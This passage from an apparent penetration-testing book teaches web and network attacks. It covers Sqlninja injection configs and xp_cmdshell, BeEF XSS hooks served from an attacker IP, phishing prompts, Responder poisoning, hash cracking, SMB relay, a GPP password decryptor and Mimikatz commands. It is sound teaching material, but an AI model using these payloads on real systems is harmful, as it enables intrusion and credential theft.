+Figure 33 - Sqlninja Help Page
+The only issue I’ve had with Sqlninja, is that the configuration file is a bit more difficult to set up and
+I’ve never found great or easy to read documentation. So I’ll give the similar two examples from
+SQLmap.
+In Sqlninja, you need to define the vulnerable variable to inject by using the __SQL2INJECT__
+command. This is different from SQLmap, where we didn’t’ need to specify which field to test
+against. Let’s go through a couple of examples as it should make things much more clear. Before we
+can use Sqlninja, we need to define the SQL configuration file. 
+This will contain all the information
+about the URL, the type of HTTP method, session cookies, and browser agents.
+Let me show you the easiest way to obtain the information required for Sqlninja. As before, load up
+the Burp Suite and turn the proxy intercept on the request where the vulnerable field is passed. In the
+following example, we are going to capture requests sent to/wfLogin.aspx and identify the POST
+parameter values. This is going to have most of the information required for Sqlninja injections, but
+slight modifications will need to be made from the Burp Raw request.
+Let’s take a look at one of the requests from Burp that identified a potential SQLi vulnerability.
+
+Figure 34 - Burp Request Example
+In the next two examples, you’ll see how the most common GET and POST parameters are created.
+This can be used for any different type of HTTP method, but usually the POST and GET methods will
+be used.
+Few things to notice from the original Burp request versus how it will be entered in the Sqlninja
+configuration file are:
+The HTTP Method (GET/POST) needs to be modified to include the full URL. Burp is missing the
+http://site.com
+ in front of/wfLogin.aspx
+You have to define which parameters to fuzz by adding the __SQL2INJECT__string.
+Sometimes for Sqlninja you may need to try the attack by first closing the vulnerable SQL
+parameter. This can be done with ticks, quotes, or semi-colons.
+GET Parameter Example
+We are going to write the sql_get.conf configuration file to our Kali desktop with two vulnerable
+parameters. Sqlninja will try to attack both the user and pass fields and try to validate if they are
+vulnerable. To create/modify the configuration file in a terminal, type:
+gedit ~/Desktop/sql_get.conf
+Enter the following into the configuration file and save it:
+—httprequest_start—
+
+G E T 
+http://site.com/wfLogin.aspx?
+user=test’;__SQL2INJECT__&pass=test’;__SQL2INJECT__HTTP/1.0
+Host: 
+site.com
+User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418Firefox/1.0.8
+Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png,*/*
+Accept-Language: en-us, en; q=0.7, it;q=0.3
+Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
+Connection: close
+—httprequest_end—
+POST Parameter Example
+A POST request differs from a GET in the fact that the parameters are passed in the data section
+instead of being part of the URL. In a terminal we need to create the configuration file and modify the
+parameters to inject into. In this example, we will inject into both the username and password:
+gedit ~/Desktop/sql_post.conf
+Enter the following into the configuration file and save it:
+—httprequest_start—
+POST 
+http://site.com/wflogin.aspx
+ HTTP/1.0
+
+Host: 
+site.com
+User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
+Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png, */*
+Accept-Language: en-us, en; q=0.7, it;q=0.3
+Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
+Connection: close
+username=test’;__SQL2INJECT__&password=test’;__SQL2INJECT__
+—httprequest_end—
+Executing Sqlninja
+Whether you use a GET or POST method attack, to execute your attack will be the same. Now that we
+created a configuration file, we can use the following command to run Sqlninja:
+sqlninja -mt -f sql_get.conf
+The following command says to run Sqlninja using the test mode to see if the injection works with the
+configuration file we just created. If you are lucky and do find a valid SQL injection, you can start to
+attack the database. In the following example, we are going to exploit our database, find the version,
+check to see if we are the “sa” account (who has administrative privileges), and see if we have
+access to a shell.
+
+Figure 35 - Sqlninja Example
+Once we have xp_cmdshell available, we want to test that we have command line access and what
+types of privileges we have. In the example below we are exploiting the SQLi vulnerability and
+testing command line commands.
+During this specific test (image below), it looks like we might be running commands on the server,
+but we’d need to validate this. The issue though, is after setting up a listener on a server we own on
+the Internet, it doesn’t look like we are seeing any connections from 
+the compromised server
+outbound. This could be a problem if we wanted to exfiltrate data back to us or download additional
+malware. Since with the command line console created by Sqlninja doesn’t show the responses from
+commands, we really need to validate that our commands are successfully executing.
+The best way to check if a command is working is by putting tcp-dump to listen for pings on a server
+we owned publicly available on the Internet. By running ping commands on a compromised server,
+we can easily validate if our server is responding to pings. The reason to use pings is because ICMP
+is generally allowed outbound and is less likely to trigger IDS/IPS signatures. This can be configured
+with the following command on an external server owned by the attacker:
+
+tcpdump -nnvXSs 0 -c2 icmp
+This command will log any pings sent to my server and I’ll be able to validate that the server can talk
+outbound and that my commands are working. On my compromised SQLi host I execute a simple ping
+back to my server. If it is successful, tcpdump will see the ICMP request.
+Command line SQLi attacks can be run with the following command:
+sqlninja -f [configuration_file] -m c
+As we can see with the image below, I first tried to run telnet commands back to my server, but that
+was unsuccessful. I then tried to initiate ping commands back to my server, where tcpdump was
+listening. In this case, my attack was successful and that proved I could run full commands on this
+host, but it does not have web access back out.
+In the image below, the top portion is my server logging pings and the bottom image is the victim host
+that is vulnerable to SQLi. Although the telnet commands seem to fail, the pings are successful.
+Figure 36 - SQLMap Command Injection Ping
+If you have gotten this far and you aren’t sure what to do next, you can jump to the 
+Lateral Pass
+Section
+ to get an idea on next steps. This should give you enough details to help you start testing and
+practicing on vulnerable frameworks. Of course these are the best scenario options, where the SQLi
+works without having to configure detailed settings about the database type, blind SQLi type, or other
+
+timing type issues.
+I can’t talk about web application vulnerabilities without talking about Cross-Site Scripting (XSS).
+This is probably one of the most common 
+vulnerabilities that I identify. As we know, XSS is a user
+attack that is caused by the lack of input validation of the application. There are two types of XSS,
+reflective and stored, which allow an attacker to write script code into a user’s browsers. I am going
+to focus on reflective XSS as it is the most common and for the most part, exploiting the vulnerability
+is relatively similar.
+BeEF Exploitation Framework (
+http://beefproject.com/
+) (Kali Linux)
+The general question I get from my clients is, “how much harm can an XSS really cause?” Remember
+that with this vulnerability you have the full ability to write scripting code on the end user’s browser
+so anything that you could do in JavaScript could be used against the victim. In this section, we’ll
+dive into how malicious you can be with an XSS attack.
+The best tool I’ve seen to be used with different XSS attacks is called the BeEF Exploitation
+Framework. If you find an XSS, you can not only cause a victim to become part of your pseudo-botnet
+you can also steal the contents of the copy memory, redirect them to links, turn on their camera, and so
+much more.
+If you do find a valid XSS on a site, you will need to craft your XSS findings to utilize the BeEF
+Framework. For our XSS examples in this chapter, we are going to use an XSS that was identified
+from our initial 
+Burp Active Scans
+. Let’s take the example vulnerable URL of:
+http://www.securepla.net/xss_example/example.php?alert=test
+’<script>[iframe]</script>
+From the 
+Setting Up a Penetration Box Section
+, we’ve installed BeEF into/usr/share/beef-xss. We are
+going to have to first start the BeEF service:
+Starting BeEF Commands:
+cd/usr/share/beef-xss
+./beef
+
+Figure 37 - Starting Up BeEF
+Let’s log into the console UI after the BeEF server has started. As we see from the image above, the
+UI URL in this case is located at http://127.0.0.1:3000/ui/authentication. We can open a browser and
+go to that URL.
+Figure 38 - BeEF Login Screen
+If everything started up successfully, you’ll have to log into the UI using the username and password
+
+of beef: beef. If we look at the image where we loaded BeEF via command line, we saw both a URL
+for the UI page and the hook page (Hook URL). Let’s take a quick second and review the hook page
+(hook.js).
+Figure 39 - BeEF Client Side JavaScript
+Although this JavaScript has been well obfuscated, this is the payload that will control the victim user
+and will be injected into the victim browser’s page. Once injected, their browser will connect back
+into your central server and the victim will be unaware.
+So if we have located an XSS vulnerability on a page, we can now use BeEF to help with the
+exploitation of the end user. In our initial example, 
+http://securepla.net/xss_example/example.php?
+alert=
+, the alert variable takes any input and presents it to the end user. We can manually add our
+JavaScript code here and send the link to our unsuspecting user. In the example below, I print out the
+user’s DOM cookies using the JavaScript code:
+<script>alert(document.cookie)</script>
+
+Figure 40 - Example XSS Finding
+This proves that the end user does process the JavaScript code embedded from our query. To create a
+successful exploit, instead of printing the cookies, we are going to craft a URL that uses JavaScript to
+include the hook.js file. It will look something like: 
+http://securepla.net/xss_example/example.php?
+alert=
+asda<script src=http://192.168.10.91:3000/hook.js></script>. I was able to append the hook.js
+script by using the JavaScript code:
+<script src=[URL with hook.js]></script>
+Remember that if this is done on a public site then the URL will need to be pointing to a public
+address hosting the hook.js page and listening service.
+Once you trick a victim to go to that URL using 
+Social Engineering Tactics
+, they will be part of your
+XSS zombie network. Going back to our UI panel, we should now see a victim has joined our server.
+
+Figure 41 - BeEF Client Attacks
+With an account hooked, there are many different modules within BeEF to exploit the end user. As
+from the image above, you can try to steal stored credentials, get host IP information, scan hosts
+within their network, and so much more.
+One of my favorite attacks is called “petty theft” because of how simple it is. Drop down to Social
+Engineering folder and to Petty Theft. Configure how you want it, in this case we’ll use the Facebook
+example, and hit execute. Remember the IP for the custom logo field has to be your BeEF IP. This is
+so the victim can grab the image from your server.
+Figure 42 - Petty Theft Facebook Attack
+
+After the attacker clicks submit, on the victim’s system a Facebook password prompt will pop up.
+This is where you can get creative in targeting your users and use a popup that they would most likely
+enter. If you are looking to gain Google accounts, there is also a Google Phishing module. The
+purpose of this client side attack is that they are unaware that they are part of this zombie network and
+the password prompt should seem like it is not out of the ordinary.
+Figure 43 - Petty Theft Attack
+After the unsuspecting victim types in their password, go back to the UI to find your loot. Clicking on
+the id 0 will show the attacker what the 
+victim typed into that box. This should be enough to start
+gaining some access as the user and move laterally throughout the environment.
+Figure 44 - Petty Theft Results
+I hope I was able to demonstrate how powerful an XSS vulnerability can be. It is exponentially worse
+if the XSS finding was a stored XSS versus the reflective example we just saw. If it were stored, we
+most likely wouldn’t need to even social engineer the victim to going to the link, but just wait until
+our code was executed.
+
+Cross-Site Scripting Obfuscation:
+The problem I run into is that, it is really common to find that the application provides some sort of
+input validation for these vulnerable XSS fields. This means the XSS is still valid, but you don’t have
+all the normal characters you need to successfully take advantage of this vulnerability. The great thing
+for a pen-tester is these filters usually they are improperly configured.
+The problem with these input validation scripts, is because there are so many different types of ways
+to encode your XSS attacks, the filters 
+usually fail. You really could write a whole book about how to
+craft different XSS attacks, but here are my quick and dirty tricks to get a working list of encoders.
+Crowd Sourcing
+One of my favorite methods to find a huge number of valid XSS vulnerabilities is to visit
+http://www.reddit.com/r/xss
+. People will post on that sub-reddit the different XSS findings they have.
+To mine those XSS findings, I created a small python script that will scrape this sub-reddit for
+different XSS findings. To download a copy, go visit: 
+https://www.securepla.net/script-alertreddit-
+script/
+. The output will look something like the following:
+Figure 45 - XSS Crowd Sourcing
+As you can see, people have tried obfuscating XSS attacks with from-CharCode, percent encoding,
+htmlentities, and other JavaScript commands. Now you are armed with a good list of XSS examples
+(many of them of them still active) and encodings. One quick additional note is that I do not
+recommend you visit the vulnerable site with the XSS payloads, as you could be seen as attacking
+their website. What I wanted to do was to show you a good list of examples that might help you in
+your attacks.
+
+OWASP Cheat Sheet
+The other list I wish to mention that I’ve used often is OWASP Evasion Cheat Sheet. During my
+engagements, when I run into an encoding problem this is usually the first place I look. The cheat
+sheet can be found here: 
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+. The
+most common XSS protections I find are length issues and not allowing greater/less than symbols.
+Luckily, the OWASP has many different examples to get around these issues.
+Cross-Site Request Forgery happens when you can force an action to happen to a victim that is
+unwanted. My typical example is that you send someone a link who is currently logged into their bank
+account. When they access the link you sent them, it automatically transfers money out of their account
+into your account. This happens because there is no verification that the user went through the correct
+process to transfer money.
+What I mean is that to transfer money a user needs to login, go to their transfer payment page, select
+the recipient and then transfer the money. In a correct process, there would be a CSRF token
+generated on every page and whenever you progressed through the application, it would verify the
+previous token. You can think of this as tracking the current session/process and if any of those tokens
+are empty or wrong, do not process a transaction.
+There are many complex ways to test this, but the easiest way I manually run these tests is through
+proxying traffic. What I’ll do is exactly what I said above and I’ll go through the process of making a
+transaction and seeing if I can replay it.
+Using Burp for CSRF Replay Attacks
+Let’s take the example that a bank application allows transfers from one user to another. In the URL
+below, there are two parameters that are used. The first parameter, User, is who the money goes to
+and the Dollar is the amount. In the case below, we successfully transferred money to Frank.
+What would happen if I sent this same URL to another person who was already logged into the same
+bank application? Well if a CSRF protection wasn’t in place, it would transfer 123.44 dollars from
+the victim host to Frank instantly.
+
+Figure 46 - CSRF Example
+To test if this is possible, first we will capture the request via Burp. So, make sure that your browser
+is still proxying to Burp and make the request with user 1. This should work just fine as you went
+through the proper channels to make the transfer. You logged in, went to the transfer page, filled in the
+information, and submitted.
+In the example below, we can go to Burp’s Proxy Tab and to History, to see our last requests. At the
+very bottom, we see the request for the bank transfer. Right away we see that here is a hook cookie,
+but nothing that looks like a CSRF token.
+Figure 47 - Burp CSRF Example
+To validate this, we can actually try to repeat the request. I usually try this method, because it tells me
+instantly if I can repeat requests without having to perform any additional actions.
+If you right click anywhere in the Raw Request, you get a selection to “Send to Repeater”.
+
+Figure 48 - Sending to Burp’s Repeater
+Inside the Repeater Tab, pressing the Go button will repeat the request and the following response
+will be populated. The result in our example, was that the amount was transferred again without any
+verification that the user actually wanted to make this request. This is great because you could send
+every user of this bank that same link and Frank would become an instant millionaire.
+Figure 49 - Executing Burp Repeater
+The application shouldn’t have allowed the user to transfer money again without going through all the
+steps required to create a transfer requests. Without a CSRF token, you could have an unsuspecting
+victim click a link and have unauthorized transfers occur. If you are looking for more information on
+CSRF attacks, try going to OWASPs page: 
+https://www.owasp.org/index.php/Cross-
+Site_Request_Forgery_(CSRF
+).
+
+
+Session tokens are generally used for tracking sessions since by default HTTP is a stateless protocol.
+What you want to look for in a session token are: (1) the fact that they can’t be guessed and, (2) that
+they properly track a user. Other things you should look for are when session tokens expire, if they are
+secure, that they validate input, and that they are properly utilized.
+In this section, we are going to specifically look at making sure session tokens are properly
+randomized and that they can’t be guessed. Using Burp Suite to capture an authentication process, we
+can see in the response that there is a set-cookie value for the session tokens. This is located under
+Proxy tab and sub tab is History.
+Figure 50 - Burp’s Raw Response
+We can right click within the raw response section and send this request to the Sequencer feature.
+Figure 51 - Sending the Raw Request to Sequencer
+Once you click the Send to Sequencer, jump over to the Sequencer tab and identify which session
+tokens are important to you. Once you pick your token, you can click the 
+Start live capture
+ to start
+
+generating session tokens.
+Figure 52 - Selecting the Session Token
+Once you start the capture, a new window will pop up and it will start processing/generating tokens.
+After so many tokens, it will give you summaries of entropy (randomness), character-level analysis
+(see image below), and bit-level analysis. In the image below, Burp Suite is analyzing the placement
+of each character. There are many other features within Burp’s sequencer tool, so I recommend
+spending some time trying to understand how session tokens are generated.
+
+Figure 53 - Character Position for Cookies
+I leave a lot here to your own judgment as it just takes enough experience to understand when session
+cookies are or aren’t secure. Every major web application I’ve seen uses different types of
+implementations and algorithms to generate session tokens, so running something like the examples
+above or reviewing source code maybe required.
+Burp Suite is extremely extensible and has a lot of other features. One quick feature that I find
+extremely helpful during manual testing is the 
+Intruder function. In the Intruder function, you have the
+ability to tamper with any part of the request and provide your own data. This would be very useful if
+you want to supply your own fuzzer input to test a variable.
+We are going to walk through a very high level overview of how you could use the fuzzing feature.
+The basic idea of the following example is take an online store and see why parameter fuzzing can be
+highly beneficial. They might only link to certain items from their website, but the content managers
+could have put up all the next week’s sale items. They just wait for the next week and link the content
+from their main website homepage.
+I used to see a lot of these type issues for sites that do Black Friday sales. They have all the content
+
+hosted, but not linked anywhere on their page. Most of the time, they also list the prices of these
+products that are not public yet. Brute forcing through all the parameters allows an attacker to know
+which sale items will go on sale that following week (before the public is notified).
+I created a dummy website to demonstrate this exact issue. The website
+www.securepla.net/tehc/hack.php?id=2
+ has a GET parameter called id. You can modify this ID field
+from 1 to 2 to 3 and get different results.
+Figure 54 - Brute Forcing Parameters
+We want to brute force through all the different parameter values to see which pages exist and which
+pages do not. Since we already have 
+our traffic flowing through Burp, we can go to the Proxy tab and
+to your History tab. You will see all your past requests there. Right click on that last request and click
+Send to Intruder.
+Figure 55 - Sending Request to Intruder
+Your Intruder tab at the top menu bar will light up, and then click that Intruder tab. Move to the
+Positions tab and you’ll see a bunch of highlighted text. Since I am only testing one parameter at this
+time, I’ll click the “clear” button first, highlight just the “2” value (as it is the only one I want to fuzz),
+and click the “Add” button on the right side (
+Figure 56
+). This tells Burp to only fuzz whatever value
+is fed into the ID GET parameter and that parameter will now be yellow.
+
+There is one other configuration selection and it’s the Attack type. In this case, I’ve left it at the
+default type of Sniper. You should spend a quick a quick second and review each of the different
+types of attacks on Burp Suite’s site: 
+http://portswigger.net/burp/help/intruder_positions.html
+.
+Figure 56 - Burp Payload Positions
+Move over to the Payloads tab (still within the Intruder tab) and click the “Load” button. In this case,
+I am only loading a list of numbers from 1-100, but you can add a list of anything. If I know the
+parameter needs to be manipulated based on what I am interacting with (could be a database or an
+LDAP queries), I’ll import a list of those fuzzed parameters. It’s really up to you to figure out which
+types of tests you should fuzz. From our setup phase, you should have a great fuzzing list located
+under/opt/SecLists/on your Kali machine.
+Figure 57 - Burp List
+Once you have your list imported, you’ll need to kick off the Intruder attack. At the top menu bar, go
+
+to Intruder and Start attack. After you start the attack, a new Intruder Attack window will pop up and
+Burp will start trying all the parameter requests.
+Figure 58 - Starting Brute Forcing in Burp Suite
+
+
+Figure 59 - Burp Suite Results
+As the requests start populating, how can you tell if a site is different based on parameter injection?
+Well, the easiest way to tell is by the length of the source code on that page when that string is
+injected. If the source code length is different from a standard baseline, this informs us that there are
+changes to the page.
+If we look at the results from the test above we see that from the parameter values we are injecting
+from 5 to 26, the page content length is 509. This source length of 509 is now our baseline for testing.
+If we go through and look at all the responses of all the pages that are not 509 in length, we see that
+request 27, with a length of 456, gives us the password: dont hack me (image above).
+You can also try manipulating anything in the original request. Try testing cookie values,
+GET/POST/HEAD parameters, user-agent strings, and other possible vulnerable fields.
+I want to stress one additional aspect when testing an application. As this book is really just giving a
+high level view into web application testing, functional testing is really where you make your money.
+When I say functional testing, I see it as horizontal/vertical user rights testing, application flow
+testing, and making sure things work as they should. For example:
+Testing that users aren’t able to see other user’s sensitive data.
+Regular users can’t access administrative pages.
+Users can’t change data values of other users.
+Workflows cannot be modified outside their intended flow.
+If you are interested in learning more you can visit
+https://www.owasp.org/index.php/Web_Application_Penetration_Testing
+.
+This is where successful testers spend a majority of their time. Anyone can run scans, but if you are
+an effective and efficient manual tester, you are leagues above the norm.
+
+
+In a network level penetration test, time is of the essence. You need to have a solid understanding of
+the underlying infrastructure, 
+application, and possible vulnerabilities. This chapter should have
+helped you understand a high level overview of vulnerabilities, how to identify them, and what type
+of impact they might have if that vulnerability is not resolved.
+Web vulnerabilities will probably be the most common vulnerability you’ll identify on an external
+penetration test. You should now be able to demonstrate how to take advantage of these issues in a
+simple and quick manner.
+
+A lateral pass play is used when you can’t seem to move forward. You might be on a network, but
+without privileges or account credentials, you’d normally be stuck on a box. As a tester, where you
+start to standout is when you are able to move through the network and gain access to domain
+administrative accounts. One thing I stress as a penetration tester is that this shouldn’t be your only
+goal. It is just as important to be able to identify where sensitive data is being stored and gaining
+access to those environments. This might require pivoting through essential employees and
+understanding how the corporation segments their data.
+This section will be focused on moving through the network and trying to go from becoming a limited
+user all the way to owning the whole network. We will cover such topics as starting without
+credentials, proxying through hosts, having limited domain credentials, and then having local/domain
+credentials.
+Let’s say that you are on the network, but you don’t have any credentials yet. Maybe you cracked their
+WPAv2 Personal Wi-Fi password or popped a box that wasn’t connected to the domain. I might first
+turn on tcpdump to listen passively, identify the network, find the domain controllers, and other
+passive types attacks. Once I feel like I have an understanding of the local network, I’ll start
+compromising systems using a variety of attacks specified in the next few sections.
+(
+https://github.com/SpiderLabs/Responder
+) (Kali Linux)
+One tool that has helped me in to gain my first set of credentials is called responder.py. Responder is
+one of the first tools that listens and responds to LLMNR (Link Local Multicast Name Resolution)
+and NBT-NS (NetBIOS over TCP/IP Name Service).
+The other vulnerability Responder actively takes advantage of is the WPAD vulnerability. You can
+read more on a Technet article here: MS12-074 - Addressing a vulnerability in WPAD’s PAC file
+handling (
+blogs.technet.com/b/srd/archive/2012/11/13/ms12-074-addressing-a-vulnerability-in-
+wpad-s-pac-file-handling.aspx
+). The basics are that when a browser (IE or network LAN settings) is
+set to automatically detect settings, the victim host will try to get the configuration file from the
+
+network.
+Figure 60 - Automatically Detect Settings
+As the attacker, since we are on the same network as our victims, we can respond to Name
+Resolutions and inject our own PAC file and proxy all web traffic. This way we can also force the
+user to authenticate against our SMB servers. You might ask, “Why is this important”? If we can get
+the victim host to authenticate against our SMB servers, we can request their NTLM
+challenge/response hashes without alerting the victim that anything is misconfigured. If the user is
+already authenticated to the domain, they will try to use those cached credentials to authenticate
+against our servers.
+If you want to see what all the commands are for Responder, and to see the documentation for it, visit
+https://github.com/SpiderLabs/Responder
+. If you’ve been following the Setup Phase, we should
+already have Responder installed and let’s dive right in.
+In the example below, we start Responder with a few different flags. First, the “-i” flag is for the IP
+of your host, the “-b” flag is Off for NTLM authentication, and -r is set to Off since leaving it on
+could break things on the network:
+python
+ ./Responder.py -i [Attacker IP] -b Off -r Off -w On
+
+Figure 61 - Responder.py
+Once Responder starts running, you should give it a few minutes to be able to identify requests and
+send malicious responses. Below is this attack in progress.
+Figure 62 - Responder Results
+There are a lot of things that happened once Responder.py was running. First, we see that the LLMNR
+was poisoned for 192.168.0.2 and 
+a malicious WPAD file was sent to the victim. This now means all
+their web traffic will use our attacker machine as a proxy. This also means that anything in clear text
+is visible to us. Second, we see that we now are tracking the cookies for any website that the user
+visits. If they go to a site over HTTP after authentication, we can now become their user as we have
+all their cookies. Finally, and this is most important, we see the NTLM challenge/response hashes
+though our injected attacks.
+We do have a couple of problems with these hashes though. We can’t really use these hashes right
+away in any sort of pass-the-hash type, as these are the NTLM challenge/response hashes. What we
+can then do with these hashes is utilize John the Ripper or oclHashcat.
+
+John Example:
+$ cat hashes.txt
+cheetz::FAKEDOMAIN:1122334455667788:4D8AABB385ADC35D8ABF778E9852BC27:010100000000000000B1E1E8D4E3CE017DD523628DB503860000000001001400530045005200560045005200320030003000380002000A0073006D0062003100320003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000400160073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C0006000400020000000900200063006900660073002F003100390032002E003100360038002E0031002E0033000A001000000000000000000000000000000000000000000000000000
+$ john —format=netntlmv2 hashes.txt
+Loaded 1 password hash (NTLMv2 C/R MD4 HMAC-MD5 [32/32])
+password (cheetz)
+oclHashcat Example:
+cudaHashcat-plus64.exe -m 5600 hashes.txt password_file.txt
+These two password cracking examples are going to lead into the 
+password cracking section
+, but
+wanted to give you a quick taste of how powerful Responder is.
+Sometimes it’s not worth it to try to crack the password. If you know they have a complex password
+policy or there aren’t enough users online to get multiple hashes, you might also want to try SMB
+replay attacks. Instead of enabling the SMB server in Responder, if the victim allows NTLMv1
+authentication, you can enable Metasploit’s smb_replay module (use
+exploit/windows/smb/smb_replay). This means now that any SMB requests will be forwarded to a
+server of your choice and their challenge hashes will be authenticated against that server. Let’s say
+you are able to do this against an IT admin, chances are they’ll have escalated privileges on the
+servers you identified.
+If you do have to go this route, I’d recommend you watch the video 
+https://www.youtube.com/watch?
+v=05W5tUG7z2M
+ by Rob Fuller. He talks about using ZachAttack to help manage all the NTLM
+sessions and continually compromise the network.
+One thing that I have had issues with is if the end users or servers are configured in a way that only
+allows NTLMv2 connections, these tools will fail. The only way I have been successful in SMB
+Replay attacks for NTLMv2 authentication is using the Impact framework. You can download a copy
+here: 
+http://code.google.com/p/impacket/
+.
+
+I originally found the configuration of Impacket from http://pen-test-ing.sans.org/blog/pen-
+testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python, which goes over exactly
+how to set this all up. I won’t go into too much detail as you can visit the SANS site for more details,
+but you can create a Meterpreter executable and run the python script.
+Figure 63 - smbrelayx.py
+Once you receive an SMB connection, it will replay that SMB against another server and
+drop/execute the reverse Meterpreter binary. We’ll talk later about creating reverse shells in the
+Evading AV Section
+.
+This section assumes you are on a host that is connected on the Active Directory domain. You might
+not be a Domain Administrator, but have some privileges on the network. The hope here is to be able
+to escalate your privileges from a regular domain user to an administrative domain/local user. Let’s
+go over a few attacks that might help escalate your account to that Domain Admin account.
+You’ve popped a box within the network that has access to the domain, but you might only be a
+regular unprivileged user, not an admin. This is a perfect time to see if you can take advantage of the
+Group Policy Preference vulnerability. Let’s take a step back and describe Group 
+Policy Preferences
+(GPP). GPP are extensions for Active Directory and are configurable settings that are used with
+Group Policy Objects (GPO).
+This is a powerful feature to make a sysadmin’s life much easier and by deploying GPO settings
+within the whole environment. The issue with one of the features is that you can create/update local
+admin accounts to all the hosts within the domain. Why would someone use this feature? It might be
+because they want to push a new administrative local user on every host or update the password for a
+local account on every machine (more common than you might think). Once this setting is configured
+and GPOs are updated, all the workstations will now have this account. The problem is that this
+information (user-name/password of local admin account) has to be stored somewhere and in GPP’s
+cases they are stored on the domain readable by any AD user account.
+
+The detailed information for all the accounts pushed via GPP will be stored under \\[Domain
+Controller]\SYSVOL\[Domain]\Policies. You can just search for the file Groups.xml inside this
+folder. If you are able to find one of these files, you can look inside the Groups.xml file for a
+cpassword hash. It will look something like this:
+<Properties action=”U” userDSN=”0” dsn=”test” driver=”SQL Server” description=”test data
+source” username=”testusername”
+cpassword=”AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tLk” />
+The problem with the cpassword variable is that the password is encrypted with AES. Luckily for us,
+Microsoft has also released the symmetric AES keys publicly. This key is the same key for every
+environment on any domain.
+Figure 64 - Microsoft’s AES Key
+7
+Since we have the encryption keys, we can decrypt the passwords of the local administrative
+accounts within GPP. There are many different tools to do this, but provided here is a python script to
+reverse the encrypted password. We’ll talk later about how we can do this with PowerShell, but as I
+don’t like to get tool specific here is a simple way to complete your task.
+#!/usr/bin/env python
+#Code from 
+http://pastebin.com/TE3fvhEh
+8
+# Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy
+Preferences. This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored
+in the domain controller’s Sysvol share.
+import sys
+
+from Crypto.Cipher import AES
+from base64 import b64decode
+if(len(sys.argv) != 2):
+print “Usage: gpprefdecrypt.py <cpassword>”
+sys.exit(0)
+# Init the key From MSDN: 
+http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-
+1f2fa45dd4be%28v=PROT.13%29#endNote2
+key = “””
+4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
+f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
+“””.replace(“ “,””).replace(“\n”,””).decode(‘hex’)
+cpassword = sys.argv[1]
+cpassword += “=” * ((4 - len(sys.argv[1]) % 4) % 4)
+password = b64decode(cpassword) # Add padding to the base64 string and decode it
+o = AES.new(key, AES.MODE_CBC).decrypt(password) # Decrypt the password
+print o[:-ord(o[-1])].decode(‘utf16’) # Print it
+9
+10
+Out of the box this python code works great in Backtrack 5, though I have had issues running it in
+Kali. Once you run your python script and feed it your encrypted password, the script will decrypt it
+to its clear text counterpart. It doesn’t matter how long or complex the password is as we have the key
+
+to decrypt it. The example from above would look like the following:
+root@bt:~/Desktop# ./Gpprefdecrypt.py “AzVJmXh/
+J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tLk”
+testpassword
+No matter how complex the password is, the results are instantaneous. This whole process can also
+be used either through PowerShell (see the PowerShell section below for more details) using the
+following script: 
+https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-
+GPPPassword.ps1
+.
+To make it even more powerful, it can now be accomplished by using the POST exploitation module
+in Metasploit, too:
+use post/windows/gather/credentials/gpp
+Although I haven’t seen all companies use GPP to push accounts to their end hosts, it is still a
+common practice. If you do get access to any Domain Accounts, this is one of the first things you
+should check for.
+You should now have a local administrative account, which will possibly give you access to every
+host on the network. The next logical step would be to use something like PSExec to start attacking all
+the other hosts on the network as demonstrated in the 
+PSExec section
+.
+There are times, you might be on a host and you don’t want to spend the time cracking their password
+or putting on a key logger to capture their password. Two tools that should be in your back pocket at
+all times are Windows Credential Editor (WCE) and Mimikatz. Both these tools will try to retrieve
+the clear text password stored in memory. Please note that both of these tools will need elevated
+privileges.
+WCE - Windows Credential Editor
+ (
+http://www.ampliasecurity.com/research/wcefaq.html
+)
+(Windows)
+We’ve all used Metasploit and pass-the-hash, but passwords are what we are really after…WCE is
+
+the answer.
+“Windows Credentials Editor (WCE) is a security tool that allows to list Windows logon sessions
+and add, change, list and delete associated credentials (e.g.: LM/NT hashes, Kerberos tickets and
+clear text passwords).”
+11
+At the time of this book, you can download the latest WCE binary from
+http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+, but we should have already
+grabbed it during the setting up your box section.
+Why is WCE so powerful? In the example below, the two commands I use are wce -l and wce -w.
+The -l switch is to List logon sessions and NTLM credentials (the hashes) and the -w switch is to
+dump the clear text passwords stored by the digest authentication package. This means that if you
+have administrative credentials, you can grab the password of that user in memory and you won’t
+have to spend any time cracking hashes. This is a big time saver... Let me show you how it works.
+Figure 65 - Windows Credential Editor (WCE)
+In the special teams section about 
+Evading AV
+, I’ll talk about how to get your WCE executable to
+avoid detection from AV.
+Mimikatz
+ (
+http://blog.gentilkiwi.com/mimikatz
+) (Windows)
+Mimikatz is another tool similar to WCE that recovers clear text passwords out of LSASS. I am often
+asked which tool is better, but I always advise people not to get tool specific. You will always get
+into an environment where one tool or technique won’t work or AV will pickup on one tool but not
+the other. In such cases it becomes really important to make sure that you always have a backup or
+another roundabout way to get your exploits to work.
+In the later sections, I’m going to show you how to run Mimikatz in memory so that you don’t have to
+drop any executable on the end host, but for this basic example I’ll show you the power of Mimikatz
+through the binary executable on the host.
+
+Running the executable on the victim host will drop you into a Mimikatz-like shell. The commands to
+pull clear text passwords from LSASS are:
+privilege::debug
+sekurlsa::logonPasswords full
+Figure 66 - Mimikatz
